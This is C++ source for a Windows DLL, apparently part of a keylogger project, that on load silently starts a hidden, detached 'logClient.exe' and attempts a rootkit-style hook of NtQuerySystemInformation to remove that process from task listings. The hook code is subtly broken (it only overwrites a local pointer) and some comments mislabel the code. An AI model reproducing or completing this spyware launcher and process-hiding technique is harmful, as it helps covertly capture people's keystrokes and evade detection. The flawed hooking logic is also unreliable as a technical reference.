#pragma once
#define DLL_EXPORT


#include <Windows.h>

#include <iostream>
#include <string>
#include <conio.h>
#include "logger.h"
#include <thread>

#define STR_SIZE 1024
#define NAME "C:\\Users\\Magshimim\\Documents\\My Projects\\keylogger\\logClient\\x64\\Debug\\logClient.exe"

extern "C"
{
	DECLDIR void connectAndLog()
	{

        char procFull[STR_SIZE] = {};
        // Get full path of DLL to inject
        DWORD check = GetFullPathNameA(NAME, STR_SIZE, procFull, NULL);

        // Get the length of the required wide string
        int length = MultiByteToWideChar(CP_ACP, 0, procFull, -1, NULL, 0);

        // Allocate memory for the wide string
        wchar_t* wideString = new wchar_t[length];

        // Perform the conversion
        MultiByteToWideChar(CP_ACP, 0, procFull, -1, wideString, length);

        // Set up the STARTUPINFO structure
        STARTUPINFO startupInfo;
        PROCESS_INFORMATION processInfo;

        ZeroMemory(&startupInfo, sizeof(startupInfo));
        startupInfo.cb = sizeof(startupInfo);
        startupInfo.dwFlags |= STARTF_USESHOWWINDOW;
        startupInfo.wShowWindow = SW_HIDE; // Hide the window

        ZeroMemory(&processInfo, sizeof(processInfo));

        // Create the process
        if (!CreateProcess(
            wideString,   // Application name
            NULL,              // Command line arguments
            NULL,              // Process handle not inheritable
            NULL,              // Thread handle not inheritable
            FALSE,             // Set handle inheritance to FALSE
            DETACHED_PROCESS,                 // No creation flags
            NULL,              // Use parent's environment block
            NULL,              // Use parent's starting directory
            &startupInfo,      // Pointer to STARTUPINFO structure
            &processInfo)      // Pointer to PROCESS_INFORMATION structure
            ) {
            // Handle the error
            std::cerr << "CreateProcess failed: " << GetLastError() << std::endl;
            return;
        }
        // Close process and thread handles
        CloseHandle(processInfo.hProcess);
        CloseHandle(processInfo.hThread); 
        std::this_thread::sleep_for(std::chrono::seconds(3));
        HookNtQuerySystemInformation();

	}
    NTSTATUS HookedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
    {

        // Call the original NtQuerySystemInformation function
        NTSTATUS status = OriginalNtQuerySystemInformation(
            SystemInformationClass,
            SystemInformation,
            SystemInformationLength,
            ReturnLength);

        // Check if the function call was successful and if we are querying process information
        if (NT_SUCCESS(status) && SystemInformationClass == SystemProcessInformation) {
            PSYSTEM_PROCESS_INFORMATION spi = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
            PSYSTEM_PROCESS_INFORMATION spiPrev = nullptr;

            // Iterate through the list of processes
            while (spi) {
                // Check if the current process is the one we want to hide (e.g., "target_process.exe")
                if (spi->ImageName.Buffer && _wcsicmp(spi->ImageName.Buffer, L"logClient.exe") == 0) { // Change "target_process.exe" to the process name you want to hide
                    if (spiPrev) {
                        // If there is a previous process, adjust its NextEntryOffset to skip the current process
                        if (spi->NextEntryOffset == 0) {
                            spiPrev->NextEntryOffset = 0;
                        }
                        else {
                            spiPrev->NextEntryOffset += spi->NextEntryOffset;
                        }
                    }
                    else {
                        // If the process to hide is the first in the list, adjust the base pointer
                        if (spi->NextEntryOffset == 0) {
                            *(ULONG*)SystemInformation = 0;
                        }
                        else {
                            memcpy(spi, (PBYTE)spi + spi->NextEntryOffset, SystemInformationLength - ((PBYTE)spi - (PBYTE)SystemInformation));
                        }
                    }
                    break; // Exit the loop after hiding the process
                }
                spiPrev = spi; // Update the previous process pointer
                if (spi->NextEntryOffset == 0) break; // Exit the loop if there are no more processes
                spi = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)spi + spi->NextEntryOffset); // Move to the next process
            }
        }

        return status; // Return the status from the original function call
    }
    void HookNtQuerySystemInformation()
    {
        // Get a handle to ntdll.dll
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (hNtdll)
        {
            // Get the address of NtQuerySystemInformation
            OriginalNtQuerySystemInformation = (PFN_NT_QUERY_SYSTEM_INFORMATION)GetProcAddress(hNtdll, "NtQuerySystemInformation");
            if (OriginalNtQuerySystemInformation) 
            {
                DWORD oldProtect;
                // Change the memory protection to allow writing to the function pointer
                VirtualProtect(OriginalNtQuerySystemInformation, sizeof(PFN_NT_QUERY_SYSTEM_INFORMATION), PAGE_EXECUTE_READWRITE, &oldProtect);
                // Replace the original function pointer with our hook
                *(PFN_NT_QUERY_SYSTEM_INFORMATION*)&OriginalNtQuerySystemInformation = HookedNtQuerySystemInformation;
                // Restore the original memory protection
                VirtualProtect(OriginalNtQuerySystemInformation, sizeof(PFN_NT_QUERY_SYSTEM_INFORMATION), oldProtect, &oldProtect);
            }
        }
    }
}

  


BOOL APIENTRY DllMain(HINSTANCE hModule, // Handle to DLL modul
	DWORD ul_reason_for_call,
	LPVOID lpReserved) // Reserved

{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		DisableThreadLibraryCalls(hModule);
		connectAndLog();
		break;
	}
	return TRUE;
}

